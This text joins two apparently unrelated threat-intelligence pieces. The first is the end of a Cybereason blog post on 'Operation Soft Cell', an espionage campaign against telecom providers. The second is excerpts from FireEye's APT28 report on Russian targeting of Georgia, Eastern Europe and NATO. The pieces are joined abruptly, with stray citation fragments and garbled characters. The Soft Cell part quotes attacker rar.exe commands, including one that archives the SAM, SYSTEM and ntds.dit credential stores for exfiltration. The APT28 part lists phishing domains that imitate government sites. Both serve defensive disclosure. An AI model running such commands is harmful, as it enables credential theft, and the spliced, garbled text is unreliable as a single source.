contains a PIVY stager, which is then loaded by the Samsung tool.\\nAfter the fake DLL was loaded by the Samsung tool, it decrypted a blob payload in the same folder, which contains the actual PIVY payload.\\nIt was able to achieve persistence by creating a rogue scheduled task.\\nPost-persistence execution of PIVY, side-loaded into a legitimate Samsung application.\\nPIVY’s use of DLL side-loading to abuse Samsung tools is not new, and has been reported previously by Palo Alto. In 2016 it was used to attack pro-democratic activists in Hong Kong, most probably by Chinese threat actors.\\n⚠️ Note: Our team has reached out to and advised the targeted organizations on active containment actions.\\nSecondary Web Shells\\nIn later stages of the attack, the threat actor deployed two other custom-built web shells. From these web shells, they launched reconnaissance commands, stole data, and dropped additional tools including portqry.exe, renamed cmd.exe, winrar, and the notorious hTran.\\nReconnaissance and lateral movement commands launched from the secondary web shell.\\nData Exfiltration\\nThe threat actor exfiltrated stolen data using multiple different channels including web shells and hTran.\\nCompressing the Stolen Data\\nIn an attempt to hide the contents of the stolen data, the threat actor used winrar to compress and password-protect it. The winrar binaries and compressed data were found mostly in the Recycle Bin folder, a TTP that was previously observed in APT10-related attacks, as well as others. This threat actor is known to stage the data in multi-part archives before exfiltration.\\nThe threat actor used the following commands to compress the data.\\nrar.exe a -k -r -s -m1 -password REDACTED.rar REDACTED.temp\\nrar.exe a -k -r -s -m1 -password REDACTED.rar REDACTED.csv\\nrar a -r -password REDACTED.rar sam system ntds.dit\\nCompressed stolen data exfiltrated via web shell.\\nThe contents of the compressed data was crucial in understanding the threat actor’s motivation for the attack, as well as what type of information they were after.\\nhTran\\nIn order to exfiltrate data from a network segment not connected to the Internet, the threat actor deployed a modified version of hTran. This ‘connection bouncer’ tool lets the threat actor redirect ports and connections between different networks and obfuscate C2 server traffic. There have been numerous reports of hTran being used by different Chinese threat actors, including: APT3, APT27 and DragonOK.\\nThe threat actor made some modifications to the original source code of hTran. Many strings, including the debug messages, were intentionally changed and obfuscated in an attempt to evade detection and thwart efforts to identify the malware by antivirus and researchers.\\nObfuscated debug messages.\\nSince the original source code for hTran is publicly available, we were able to compare the debug output to the original source code to show that it has indeed been modified.\\nIdentifying modifications in a disassembly of the modified hTran.\\nprintf is being called (dubbed by us as “looks_like_printf”) with output “C e.”. By looking at the original source code, we were able to identify that this is supposed to be “Connect error”.\\nA section of the source code for hTran.\\nUnderstanding the Motive\\nWhen you think of large breaches to big organizations, the first thing that comes to mind is usually payment data. An organization that provides services to a large customer base has a lot of credit card data, bank account information, and more personal data on its systems. These attacks are usually conducted by a cybercrime group looking to make money.\\nIn contrast, when a nation state threat actor is attacking a big organization, the end goal is typically not financial, but rather intellectual property or sensitive information about their clients.\\nOne of the most valuable pieces of data that telecommunications providers hold is Call Detail Records (CDRs). CDRs are a large subset of metadata that contains all details about calls, including:\\nSource, Destination, and Duration of a Call\\nDevice Details\\nPhysical Location\\nDevice Vendor and Version\\nFor a nation state threat actor, obtaining access to this data gives them intimate knowledge of any individuals they wish to target on that network. It lets them answer questions like:\\nWho are the individuals talking to?\\nWhich devices are the individuals using?\\nWhere are the individuals traveling?\\nHaving this information becomes particularly valuable when nation-state threat actors are targeting foreign intelligence agents, politicians, opposition candidates in an election, or even law enforcement.\\nExample 1: CDR Data\\nExample 2: CDR Data\\nExample 3: CDR Data\\nBeyond targeting individual users, this attack is also alarming because of the threat posed by the control of a telecommunications provider. Telecommunications has become critical infrastructure for the majority of world powers. A threat actor with total access to a telecommunications provider, as is the case here, can attack however they want passively and also actively work to sabotage the network.\\nThis attack has widespread implications, not just for individuals, but also for organizations and countries alike. The use of specific tools and the choice to hide ongoing operations for years points to a nation state threat actor, most likely China. This is another form of cyber warfare being used to establish a foothold and gather information undercover until they are ready to strike.\\nWant to learn about post-incident review?\\nThreat Intel Research\\nThe following sections detail the methodology and work process used to piece together the various stages and components of the attack. This work enabled us to not only reconstruct these attacks, but also to find additional artifacts and information regarding the threat actor and its operations.\\nMethodology\\nStep 1: Creating and Maintaining an IOC Inventory\\nThe first step in this process was to create a comprehensive list of indicators of compromise (IOCs) observed throughout the different stages of the attack. This list included various indicators, such as file hashes, domains, IP addresses, file names, and registry/service names. In addition to this, our reverse engineers were able to extract further IOCs from the collected samples, which have also been added to the list.\\nThe list of IOCs was periodically updated and fed back into our threat intel engine as more were discovered.\\nStep 2: Hunting for Known Evil\\nEquipped with an ever-growing list of known IOCs, our team set out to hunt for “low-hanging fruit” across multiple environments. This step was done by using both internal sources, such as the Cybereason solution, as well as hunting for indicators in the wild.\\nThe hunt for “known evil” yielded interesting results that helped uncover additional compromised assets as well as more parts of the attack infrastructure.\\nStep 3: Threat Actor’s Arsenal\\nPerhaps one of the most interesting steps involved identifying and analyzing the tools the threat actor used throughout the attack. The combination of the preference of tools, sequence of use, and specifically how they are used during the attack says a lot about a threat actor, especially when it comes to attribution.\\nOne of the more notable aspects was how the threat actor used mostly known tools that were customized for this specific attack. Each tool was customized differently, and included re-writing the code, stripping debug symbols, string obfuscation, and embedding the victim’s specific information within the tools’ configuration.\\nHowever, the threat actor also used tools we were not able to attribute to any known tool. These tools were used in the later stages of the attack, once the operation was already discovered. This was most likely to decrease the risk of exposure or attribution.\\nFinally, the payloads were almost never repeated. The threat actor made sure that each payload had a unique hash, and some payloads were packed using different types of packers, both known and custom.\\nThe main tools these attacks had in common are:\\nWeb Shells\\nA modified version of the China Chopper web shell was used for initial compromise.\\nCustom-built web shells were used for later phases of the attack.\\nReconnaissance Tools\\nA modified version of Nbtscan was used to identify available NetBIOS name servers locally or over the network.\\nMultiple Windows built-in tools were used for various tasks, including whoami, net.exe, ipconfig, netstat, portqry, and more.\\nWMI and PowerShell commands were used for various tasks.\\nRAT\\nPoisonIvy was used to maintain access across the compromised assets.\\nPlugX was used in some of the instances that we\\'re aware of.\\nCredential Dumpers\\nA modified version of Mimikatz was used to dump credentials stored on the compromised machines.\\nA PowerShell-based Mimikatz was also used to dump credentials stored on the compromised machines.\\nLateral movement\\nWMI was used for lateral movement.\\nPsExec was also used for lateral movement.\\nConnection Proxy\\nA modified version of hTran was used to exfiltrate stolen data.\\nCompression tool\\nWinrar was used to compress and password-protect stolen data.\\nStep 4: Creating a TTP-based Behavioral Profile\\nOne of the key components of threat hunting is to create a TTP-based behavioral profile of the threat actor in question. Malware payloads and operational infrastructure can be quickly changed or replaced over time, and as such, the task of tracking a threat actor can become quite difficult.\\nFor that reason, it is crucial to profile the threat actor and study its behavior, the tools it uses, and its techniques. These behavioral-based TTPs are less likely to change drastically, and are\\\\ key factors of any threat hunt or attribution efforts.\\nThe Cybereason solution is compatible with the MITRE ATT&CK framework, which made it easy to keep track of the observed TTPs and correlate the data with known threat actors.\\nThe following chart reflects the behavioral profile of the threat actor based on the most frequently observed techniques used throughout these attacks.\\nMITRE ATT&CK Techniques Breakdown\\nInitial Access\\nExecution\\nPersistence\\nPrivilege Escalation\\nDefense Evasion\\nCredential Access\\nExploit Public-Facing Application\\nCommand-line interface\\nWeb Shell\\nValid Accounts\\nDLL-side Loading\\nCredential Dumping\\nWindows Management Instrumentation\\nCreate Account\\nWeb Shell\\nIndicator Removal from Tools\\nPowerShell\\nObfuscated Files or Information\\nMasquerading\\nDiscovery\\nLateral Movement\\nCollection\\nCommand and Control\\nExfiltration\\nImpact\\nSystem Network Configuration Discovery\\nWindows Admin Shares\\nData From Local System\\nRemote File Copy\\nData Compressed\\nRemote System Discovery\\nPass the Hash\\nData Staged\\nConnection Proxy\\nExfiltration Over Command and Control Channel\\nAccount Discovery\\nRemote File Copy\\nInput Capture\\nPermission Groups Discovery\\nStep 5: Mapping out the Infrastructure and Operational Activity\\nReconstructing the Infrastructure\\nIn order to make sense of all the data, we fed it into multiple threat intelligence sources, including our own and third parties.\\n⚠️ Note: Since we cannot share any IOCs, we will refer to file hashes, hostnames, IP addresses and other IOCs as generic placeholders.\\nHostname1 is the hostname that was used for the C2 server targeting the telecommunications providers.\\nHostname1 connected to multiple tools.\\nIn analyzing the files, it is clear they are all contacting the same host hostname1. hostname1 was the C2 server that the malware and web shells connected to.\\nOnce we determined the hashes in the scope of the attack were only connecting to hostname1, which is a dynamic DNS hostname, we looked to see if we could find more information about the C2 server.\\nA simple WHOIS query revealed that the IP address was registered to a colocation hosting company in Asia, though there was no other publicly available information about this IP address.\\nBy querying all of our threat intel resources about this IP address, we discovered that it was associated with multiple dynamic DNS hostnames.\\nMultiple dynamic DNS hostnames.\\nWe were unable to find indications of connections to Dynamic.DNS2 and Dynamic.DNS3. However, they were registered and associated with IP.Address1.\\nFor the other dynamic DNS hosts, we leveraged various threat intel repositories and crafted queries that searched for executables with these IP addresses and hostnames in their string table. One of the queries returned a few DLLs with identical names to the DLL we had initially investigated. However, the hashes were different. After obtaining the found DLLs, we patched them back into the NSIS installer and detonated the samples in our testing environment. Dynamic analysis of the newly obtained DLLs revealed a new set of domains and IP addresses that were completely different. These domains were actually related to different telecommunications providers.\\n⚠️ Note: Cybereason immediately reached out to those telecommunications providers and provided them all of the necessary information to handle the incident internally.\\nStrings from the dumped memory section of the injected shellcode. We can see many details about the attack including domains and C2 server IP addresses.\\nShellcode being unpacked and injected into a remote process. The redacted segments contain the name of the customer, C2 IP addresses, and domains.\\nInfrastructure Operational Security\\nThe threat actor’s infrastructure.\\nThe threat actor had a specific pattern of behavior that allowed us to understand their modus operandi: they used one server with the same IP address for multiple operations. This server is a key component in their ‘non-attributable’ infrastructure.\\nThe threat actor separated operations by using different hostnames per operation, though they are hosted on the same server and IP address. The domains and server registration information pointed to three main countries: China, Hong Kong, and Taiwan.\\nThis is cheap and efficient for the threat actor, but is almost transparent for a seasoned researcher with access to the right threat intelligence tools. There are previous reports of threat actors including APT10 and APT1 using dynamic DNS.\\nMonitoring this infrastructure gave us information about if and when the threat actor was starting new waves of the attack or additional attacks on other providers.\\nWhen researching C2 servers, it is important to watch for:\\nAssociation with domains, especially if they are dynamic DNS domains.\\nFile hashes that are associated with the IP address or the domain of the C2 server.\\nStatic information and metadata from associated samples that could be used to broaden the search after additional information is gathered.\\nThis demonstrates the importance of proper operational security and a separation between tools and operations for threat actors.\\nStep 6: Rounding Up Immediate/Potential Suspects\\nAttribution is a fickle and delicate art. In most cases, it is very difficult to achieve 100% certainty when attributing an attack to a specific threat actor. It can be tempting to attribute an attack to a certain threat actor whenever certain tools-of-the-trade, IP addresses, strings, or “indicative” techniques are observed.\\nHowever, it is important to bear in mind that the aforementioned data points are often prone to manipulation and reuse across different threat actors. Further, they are not impervious to psychological warfare, as in, trying to “pin” an operation on a different threat actor to avoid proper attribution.\\nIn order to increase the certainty level when attributing to a specific threat actor, we took the following aspects of the attacks into consideration:\\nIndicators of Compromise\\nTTPs (Tactics, Techniques and Procedures)\\nThreat actor\\'s tools\\nMotive behind the attacks\\nRegional and industry considerations\\nCarefully examining each of the different aspects plays an important role in avoiding misattribution. This model offers a more balanced interpretation of the data that is based on a myriad of components. By performing a contextualized review of the data, you are able to yield a more wholesome result with greater certainty.\\nWhen it comes to attributing Operation Soft Cell, we are unable to achieve 100% certainty with regard to the identity of the threat actor. However, based on our interpretation of the data, we conclude with a high level of certainty that:\\nThe threat actor behind Operation Soft Cell is likely state-sponsored.\\nThe threat actor is affiliated with China.\\nAfter following the above attribution model and carefully reviewing the data, we are able to narrow down the suspect list to three known APT groups, all of which are known to be linked to China- APT10, APT27, and DragonOK.\\nHaving found multiple similarities to previous attacks, it is our estimation that the threat actor behind these attacks is likely linked to APT10, or at the very least, to a threat actor that shares tools, techniques, motive and infrastructural preferences with those of APT10.\\nWhile we cannot completely rule out a “copy-cat” scenario, where another threat actor might masquerade as APT10 to thwart attribution efforts, we find this option to be less likely in light of our analysis of the data.\\nConclusion\\nIn this blog, we have described an ongoing global attack against telecommunications providers that has been active since at least 2017. The threat actor managed to infiltrate into the deepest segments of the providers’ network, including some isolated from the internet, as well as compromise critical assets. Our investigation showed that these attacks were targeted, and that the threat actor sought to steal communications data of specific individuals in various countries.\\nThroughout this investigation, we have uncovered the infrastructure that facilitated the malicious operations taken by this threat actor. The data exfiltrated by this threat actor, in conjunction with the TTPs and tools used, allowed us to determine with a very high probability that the threat actor behind these malicious operations is backed by a nation state, and is affiliated with China. Our contextualized interpretation of the data suggests that the threat actor is likely APT10, or at the very least, a threat actor that shares, or wishes to emulate its methods by using the same tools, techniques, and motives.\\nIt’s important to keep in mind that even though the attacks targeted specific individuals, any entity that possesses the power to take over the networks of telecommunications providers can potentially leverage its unlawful access and control of the network to shut down or disrupt an entire cellular network as part of a larger cyber warfare operation.\\nDue to multiple and various limitations, we cannot disclose all the information we have gathered on the attack in this report. Our team will continue to monitor and track the threat actor’s activity in order to identify more tools and compromised organizations.\\nAsk the researchers questions about this attack during their live webinar.\\nClosing Notes: This research, which is still ongoing, has been a huge effort for the entire Cybereason Nocturnus team. Special thanks goes to Niv Yona, Noa Pinkas, Josh Trombley, Jakes Jansen, and every single member of the Nocturnus team for the countless hours and effort that were put into this research. We will continue to monitor and update our blog with more information once available and as our investigation progresses.\\nShare\\nContinue Exploring_\\nOperation Soft Cell: A Worldwide Campaign Against Telecommunications Providers\\nRead More\\nWhat is an Advanced Persistent Threat (APT)?\\nRead More\\nAPTs, the Board, and You\\nRead More\\nOperation Soft Cell: A Worldwide Campaign Against Telecommunications Providers\\nRead More\\nWhat is an Advanced Persistent Threat (APT)?\\nRead More\\nAPTs, the Board, and You\\nRead More\\nOperation Soft Cell: A Worldwide Campaign Against Telecommunications Providers\\nRead More\\nWhat is an Advanced Persistent Threat (APT)?\\nRead More\\nAPTs, the Board, and You\\nRead More\\nOperation Soft Cell: A Worldwide Campaign Against Telecommunications Providers\\nRead More\\nWhat is an Advanced Persistent Threat (APT)?\\nRead More\\nAPTs, the Board, and You\\nRead More\\nOperation Soft Cell: A Worldwide Campaign Against Telecommunications Providers\\nRead More\\nWhat is an Advanced Persistent Threat (APT)?\\nRead More\\nAPTs, the Board, and You\\nRead More\\nOperation Soft Cell: A Worldwide Campaign Against Telecommunications Providers\\nRead More\\nWhat is an Advanced Persistent Threat (APT)?\\nRead More\\nAPTs, the Board, and You\\nRead More\\nOperation Soft Cell: A Worldwide Campaign Against Telecommunications Providers\\nRead More\\nWhat is an Advanced Persistent Threat (APT)?\\nRead More\\nAPTs, the Board, and You\\nRead More\\nOperation Soft Cell: A Worldwide Campaign Against Telecommunications Providers\\nRead More\\nWhat is an Advanced Persistent Threat (APT)?\\nRead More\\nAPTs, the Board, and You\\nRead More\\nOperation Soft Cell: A Worldwide Campaign Against Telecommunications Providers\\nRead More\\nWhat is an Advanced Persistent Threat (APT)?\\nRead More\\nAPTs, the Board, and You\\nRead More\\nOperation Soft Cell: A Worldwide Campaign Against Telecommunications Providers\\nRead More\\nWhat is an Advanced Persistent Threat (APT)?\\nRead More\\nAPTs, the Board, and You\\nRead More\\nOperation Soft Cell: A Worldwide Campaign Against Telecommunications Providers\\nRead More\\nWhat is an Advanced Persistent Threat (APT)?\\nRead More\\nAPTs, the Board, and You\\nRead More\\nOperation Soft Cell: A Worldwide Campaign Against Telecommunications Providers\\nRead More\\nWhat is an Advanced Persistent Threat (APT)?\\nRead More\\nAPTs, the Board, and You\\nRead More\\nOperation Soft Cell: A Worldwide Campaign Against Telecommunications Providers\\nRead More\\nWhat is an Advanced Persistent Threat (APT)?\\nRead More\\nAPTs, the Board, and You\\nRead More\\nOperation Soft Cell: A Worldwide Campaign Against Telecommunications Providers\\nRead More\\nWhat is an Advanced Persistent Threat (APT)?\\nRead More\\nAPTs, the Board, and You\\nRead More\\nOperation Soft Cell: A Worldwide Campaign Against Telecommunications Providers\\nRead More\\nWhat is an Advanced Persistent Threat (APT)?\\nRead More\\nAPTs, the Board, and You\\nRead More\\nReturn to Blog\\nAbout\\nWho We Are\\nCareers\\nManagement\\nContact\\nPlatform\\nOverview\\nNext Generation Antivirus\\nEndpoint Detection & Response\\nManaged Detection & Response\\nResources\\nBlog\\nCase Studies\\nWebinars\\nWhite Papers\\n©2019 Cybereason.

The New York Times 12 August 2008. Web. http://www.nytimes.com/2008/08/13/technology/13cyber.html 2 Knowlton, Brian. ﬁMilitary Computer Attack Confirmedﬂ. The New York Times. 25 August 2010. Web. http://www.nytimes.com/2010/08/26/ technology/26cyber.html EXECUTIVE SUMMARYIn this paper we discuss a threat group whose malware is already fairly well-known in the cybersecurity community. This group, unlike the China-based threat actors we track, does not appear to conduct widespread intellectual property theft for economic gain. Nor have we observed the group steal and profit from financial account information.The activity that we profile in this paper appears to be the work of a skilled team of developers and operators collecting intelligence on defense and geopolitical issues Œ intelligence that would only be useful to a government. We believe that this is an advanced persistent threat (APT) group engaged in espionage against political and military targets including the country of Georgia, Eastern European governments and militaries, and European security organizations since at least 2007. They compile malware samples with Russian language settings during working hours consistent with the time zone of Russia™s major cities, including Moscow and St. Petersburg. While we don™t have pictures of a building, personas to reveal, or a government agency to name, what we do have is evidence of long- standing, focused operations that indicate a government sponsor Œ specifically, a government based in Moscow. We are tracking this group as APT28. Our clients often ask us to assess the threat Russia poses in cyberspace. Russia has long been a whispered frontrunner among capable nations for performing sophisticated network operations. This perception is due in part to the Russian government™s alleged involvement in the cyber attacks accompanying its invasion of Georgia in 2008, as well as the rampant speculation that Moscow was behind a major U.S. Department of Defense network compromise, also in 2008. These rumored activities, combined with a dearth of hard evidence, have made Russia into something of a phantom in cyberspace. 4 fireeye.com APT 28: A Window into Russia™s Cyber Espionage Operations? KEY FINDINGSGEORGIA EASTERN EUROPE SECURITY ORGANIZATIONS APT28 likely seeks to collect intelligence about Georgia™s security and political dynamics by targeting officials working for the Ministry of Internal Affairs and the Ministry of Defense.APT28 has demonstrated interest in Eastern European governments and security organizations. These victims would provide the Russian government with an ability to predict policymaker intentions and gauge its ability to influence public opinion.APT28 appeared to target individuals affiliated with European security organizations and global multilateral institutions. The Russian government has long cited European security organizations like NATO and the OSCE as existential threats, particularly during periods of increased tension in Europe.APT28 targets insider information related to governments, militaries, and security organizations that would likely benefit the Russian government. 5 fireeye.com KEY FINDINGS Malware compile times suggest that APT28 developers have consistently updated their tools over the last seven years. APT28 malware, in particular the family of modular backdoors that we call CHOPSTICK, indicates a formal code development environment. Such an environment would almost certainly be required to track and define the various modules that can be included in the backdoor at compile time. APT28 tailors implants for specific victim environments. They steal data by configuring their implants to send data out of the network using a victim network™s mail server. Several of APT28™s malware samples contain counter- analysis capabilities including runtime checks to identify an analysis environment, obfuscated strings unpacked at runtime, and the inclusion of unused machine instructions to slow analysis. Indicators in APT28™s malware suggest that the group consists of Russian speakers operating during business hours in Russia™s major cities. More than half of the malware samples with Portable Executable (PE) resources that we have attributed to APT28 included Russian language settings (as opposed to neutral or English settings), suggesting that a significant portion of APT28 malware was compiled in a Russian language build environment consistently over the course of six years (2007 to 2013).Over 96% of the malware samples we have attributed to APT28 were compiled between Monday and Friday. More than 89% were compiled between 8AM and 6PM in the UTC+4 time zone, which parallels the working hours in Moscow and St. Petersburg. These samples had compile dates ranging from mid-2007 to September 2014. Since 2007, APT28 has systematically evolved its malware, using flexible and lasting platforms indicative of plans for long-term use. The coding practices evident in the group™s malware suggest both a high level of skill and an interest in complicating reverse engineering efforts. Malware compile times suggest that APT28 developers have consistently updated their tools over the last seven years. 6 fireeye.com Three themes in APT28™s targeting clearly reflect areas of specific interest to an Eastern European government, most likely the Russian government. 7 Bloomberg. ﬁNeiman Marcus Hackers Set Off 60,000 Alerts While Bagging Credit Card Data.ﬂ February 2014. 8 Ibid.9 Ibid.APT28 TARGETING REFLECTS Many of APT28™s targets align generally with interests that are typical of any government. However, three themes in APT28™s targeting clearly reflects areas of specific interest to an Eastern European government, most likely the Russian government. These include the Caucasus (especially the Georgian government), Eastern European governments and militaries, and specific security organizations.APT28 uses spearphishing emails to target its victims, a common tactic in which the threat group crafts its emails to mention specific topics (lures) relevant to recipients. This increases the likelihood that recipients will believe that the email is legitimate and will be interested in opening the message, opening any attached files, or clicking on a link in the body of the email. Since spearphishing lures are tailored to the recipients whose accounts APT28 hopes to breach, the subjects of the lures provide clues as to APT28™s targets and interests. For example, if the group™s lures repeatedly refer to the Caucasus, then this most likely indicates that APT28 is trying to gain access to the accounts of individuals whose work pertains to the Caucasus. Similarly, APT28™s practice of registering domains that mimic those of legitimate news, politics, or other websites indicates topics that are relevant to APT28™s targets. We identified three themes in APT28™s lures and registered domains, which together are particularly relevant to the Russian government. In addition to these themes, we have seen APT28 target a range of political and military organizations. We assess that the work of these organizations serves nation state governments. RUSSIAN INTERESTSThe Caucasus, particularly the country of GeorgiaEastern European governments and militariesThe North Atlantic Treaty Organization (NATO) and other European security organizationsAPT 28: Three Themes 7 fireeye.com The Caucasus, a region that includes Chechnya and other Russian republics and the independent states of Georgia, Armenia, and Azerbaijan, continues to experience political unrest. The Georgian government™s posture and ties to the West are a frequent source of Moscow™s frustration, particularly after the 2008 war. Overall, issues in the Caucasus likely serve as focal points for Russian intelligence collection efforts.APT28 INTEREST IN THE CAUCASUS, PARTICULARLY GEORGIA Since 2011, APT28 has used lures written in Georgian that are probably intended to target Georgian government agencies or citizens. APT28 is likely seeking information on Georgia™s security and diplomatic postures. Specifically, the group has targeted the Georgian Ministry of Internal Affairs (MIA) and the Ministry of Defense (MOD). We also observed efforts to target a journalist working on issues in the Caucasus and a controversial Chechen news site. RUSSIAChechnyaGEORGIAAbkhaziaTURKEYARMENIAAZERBAIJANTbilisiArmenian MilitaryYerevan Kavkaz Center 8 fireeye.com APT28 Targeting of the Georgian Ministry of Internal Affairs (MIA)The MIA harbors sensitive information about the inner workings of Georgia™s security operations, the country™s engagement in multilateral institutions, and the government™s communications backbone. It is responsible for3:Policing, internal security, and border patrols CounterintelligenceCounterterrorismInternational relationsDefense of Georgia™s strategic facilities and assetsﬁOperative-Technicalﬂ tasks APT28 made at least two specific attempts to target the MIA. In one case, we identified an APT28 lure from mid-2013 that referenced MIA-related topics and employed malware that attempted to disguise its activity as legitimate MIA email traffic. The lure consisted of a weaponized Excel file that presented a decoy document containing a list of Georgian driver™s 3 Georgian Ministry of Internal Affairs website http://police.ge/en/home 4 Queries on the author yielded a LinkedIn page for a person of the same name who serves as a system administrator in Tbilisi. license numbers. The backdoor attempted to establish a connection to a Georgian MIA mail server and communicate via MIA email addresses ending with ﬁ@mia.ge.govﬂ. Once connected to the mail server, APT28™s backdoor sent an email message using a subject line related to driver™s licenses (in Georgian), and attached a file containing system reconnaissance information. This tactic could allow APT28 to obtain data from the MIA™s network through a less-monitored route, limiting the MIA network security department™s abilities to detect the traffic. In the second example of MIA targeting, an APT28 lure used an information technology-themed decoy document that included references to the Windows domain ﬁMIA Users\\\\Ortachala–ﬂ (Figure 1). This probably referred to the MIA facility in the Ortachala district of Tbilisi, Georgia™s capital city. The decoy document also contains metadata listing ﬁMIAﬂ as the company name and ﬁBeka Nozadzeﬂ 4 as an author, a possible reference to a system administrator in Tbilisi. The text of the document purports to provide domain and user group setup APT28 made at least two specific attempts to target the Georgian Ministry of Internal Affairs.Georgian Ministry of Internal Affairs (MIA)APT 28: A Window into Russia™s Cyber Espionage Operations? 9 fireeye.com Figure 1: Georgian MIA-related decoy information for internal Windows XP and Windows 7 systems. APT28 possibly crafted this document to appear legitimate to all MIA system users and intended to breach the MIA network specifically using the embedded malware.APT28 Targeting of the Georgian Ministry of DefenseAPT28 also appeared to target Georgia™s MOD along with a U.S. defense contractor that was training the Georgian military. APT28 used a lure document that installed a SOURFACE downloader (further discussed in the Malware section) and contained a listing of birthdays for members of a working group between the Georgian MOD and the U.S. defense contractor. The U.S. contractor was involved in a working group to advise the MOD and Georgian Armed Forces, assess Georgia™s military capabilities, and develop a military training program for the country. 10 fireeye.com Figure 2: Excerpt of APT28™s letter to a journalist writing on Caucasus-related issues We believe that APT28™s targeting of the MOD aligns with Russian threat perceptions. The growing U.S.-Georgian military relationship has been a source of angst for Russia. Georgia and Russia severed diplomatic relations following the Russia-Georgia War in 2008, and Georgia has since sought to align itself more closely with western security organizations. Additionally, in June 2014, despite Russia™s vocal objections, Georgia, along with Ukraine and Moldova, signed association accords with the EU. 5 This move placed all three countries more firmly in the EU™s political, economic, and security spheres of influence. Georgian military security issues, particularly with regard to U.S. cooperation and NATO, provide a strong incentive for Russian state-sponsored threat actors to steal information that sheds light on these topics.APT28 Targeting a Journalist Covering the Caucasus Another one of APT28™s lures appeared to target a specific journalist covering issues in the Caucasus region. In late 2013, APT28 used a lure that contained a letter addressing a journalist by his first name and claiming to originate from a ﬁChief Coordinatorﬂ in Reason Magazine™s ﬁCaucasian Issues Departmentﬂ - a division that does not appear to exist. 6 (Reason Magazine is a US-based magazine) The letter welcomed the individual as a contributor and requested topic ideas and identification information in order to establish him at the magazine. In the background, the decoy document installed a SOURFACE backdoor on the victim™s system. We wish our cooperation will be both profitable and trusted. Our aim in the Caucasian region is to help people who struggle for their independence, liberty and human rights. We all know, that world is often unfair and cruel, but all together we can make it better. Send your articles on this email Œ in Russian or English, please. There are some difficulties with Caucasian languages, but we™ll solve the problem pretty soon, I hope. 5 ﬁThe EU™s Association Agreements with Georgia, the Republic of Moldova and Ukraineﬂ. European Union Press Release Database. 23 June 2014. Web. http://e uropa.eu/rapid/press-release_MEMO-14-430_en.htm 6 We attempted to identify candidate journalists in the country. One of these was a Georgian national of Chechen descent, whose work appears to center on Chechen and human rights issues. Ultimately, however, we cannot confirm the identity of the target(s). Targeting journalists could provide APT28 and its sponsors with a way to monitor public opinion, identify dissidents, spread disinformation, or facilitate further targeting. 11 fireeye.com The body of the letter suggests that APT28 actors are able to read at least two languages Œ Russian and English. The grammar of the letter also indicates that English is not the author™s first language, despite it purportedly originating from a US-based magazine. This implies that Russian may be the APT28 author™s preferred language.Targeting journalists could provide APT28 and its sponsors with a way to monitor public opinion, identify dissidents, spread disinformation, or facilitate further targeting. Several other nation states are suspected of targeting journalists and dissidents to monitor their activity, including China and Iran. 7,8 Journalists in the Caucasus working on Caucasus independence issues would be a prime target for intelligence collection for Moscow. Journalists critical of the Kremlin have long been targets of surveillance and harassment, and a number of governments and human rights organizations have publicly criticized the government for its treatment of journalists and its increasing consolidation of control over the media. 9 APT28™s Other Targets in the Caucasus We have seen APT28 register at least two domains mimicking the domains of legitimate organizations in the Caucasus, as shown in the table below. One APT28 domain imitated a key Chechen-focused news website, while the other appeared to target members of the Armenian military by hosting a fake login page. Of particular note, the Kavkaz Center is a Chechen-run website designed to present an alternative view to the long-running conflict between Russia and Chechen separatists. In 200410 and 2013,11 Russia™s Foreign Minister voiced his displeasure that a Swedish company continues to host the Kavkaz Center website. 7 Moran, Ned, Villeneuve, Nart, Haq, Thofique, and Scott, Mike. ﬁOperation Saffron Roseﬂ.

The Kremlin has long regarded the former Soviet Republics and satellite states as in its sphere of economic, political, and military interest. Over the past two decades, as many of these states joined NATO and the EU, Russia has attempted to regain its influence in the region. Many of APT28™s targets parallel this continued focus on Eastern European governments and militaries. APT28 Targets Eastern European Government Organizations We have evidence that APT28 made at least two attempts to compromise Eastern European government organizations: In a late 2013 incident, a FireEye device deployed at an Eastern European Ministry of Foreign Affairs detected APT28 malware in the client™s network.More recently, in August 2014 APT28 used a lure (Figure 3) about hostilities surrounding a Malaysia Airlines flight downed in Ukraine in a probable attempt to compromise the Polish government. A SOURFACE sample employed in the same Malaysia Airlines lure was referenced by a Polish computer security company in a blog post. 12 The Polish security company indicated that the sample was ﬁsent to the government,ﬂ presumably the Polish government, given the company™s location and visibility. 12 ﬁMHT, MS12-27 Oraz *malware*.infoﬂ Malware@Prevenity. 11 August 2014.

These domain registrations not only suggest that APT28 is interested in Eastern European political affairs, but also that the group targets Eastern European governments directly. In addition, APT28 used one domain for command and control sessions (baltichost.org) that was themed after the Baltic Host exercises. Baltic Host is a multinational logistics planning exercise, hosted annually since 2009 by one of the three Baltic States (Estonia, Latvia, and Lithuania, all three of which are on Russia™s border) on a rotational basis. In June 2014, this event was integrated with a larger U.S. Army training event, and focused on exercises to improve interoperability with regional allies and partners.13, 14 This domain registration suggests that APT28 sought to target individuals either participating in the exercises or interested in Baltic military and security matters. Such targets would potentially provide APT28 with sensitive tactical and strategic intelligence concerning regional military capabilities and relationships. These exercises are a particular point of interest in Moscow: pro-Kremlin press cited Russia™s interpretation of these military exercises and NATO™s involvement as a ﬁsign of aggression,ﬂ and Russia™s Foreign Minister publicly stated that the exercise was ﬁa demonstration of hostile intention.ﬂ 15 Table 2: Examples of APT28 domains imitating legitimate Eastern European organization names APT28 DomainReal Domainstandartnevvs.comBulgarian Standart News website (standartnews.com)novinitie.com, n0vinite.comBulgarian Sofia News Agency website (novinite.com)qov.hu.comHungarian government domain (gov.hu) q0v.pl, mail.q0v.plPolish government domain (gov.pl) and mail server domain (mail.gov.pl) poczta.mon.q0v.plPolish Ministry of Defense mail server domain (poczta.mon.gov.pl) 13 ﬁSaber Strike and Baltic Host kick off in Latvia, Lithuania and Estonia™.

APT28™s lures and domain registrations also demonstrate their interest in NATO and other European security organizations. NATO remains a chief Russian adversary, or in the words of Russia™s 2010 military doctrine, a ﬁmain external military dangerﬂ particularly as it moves ﬁcloser to the borders of the Russian Federation.ﬂ 16 As the traditional western counterweight to the Soviet Union, Russia regards NATO, particularly NATO™s eastward expansion, as a threat to Russia™s strategic stability. APT28 also registered a domain name imitating the Organization for Security and Cooperation in Europe (OSCE), an intergovernmental organization that has cited widespread fraud in numerous Russian state elections. Insider information about NATO, the OSCE and other security organizations would inform Russian political and military policy. Several of the domains APT28 registered imitated NATO domain names, including those of NATO Special Operations Headquarters and the NATO Future Forces Exhibition.

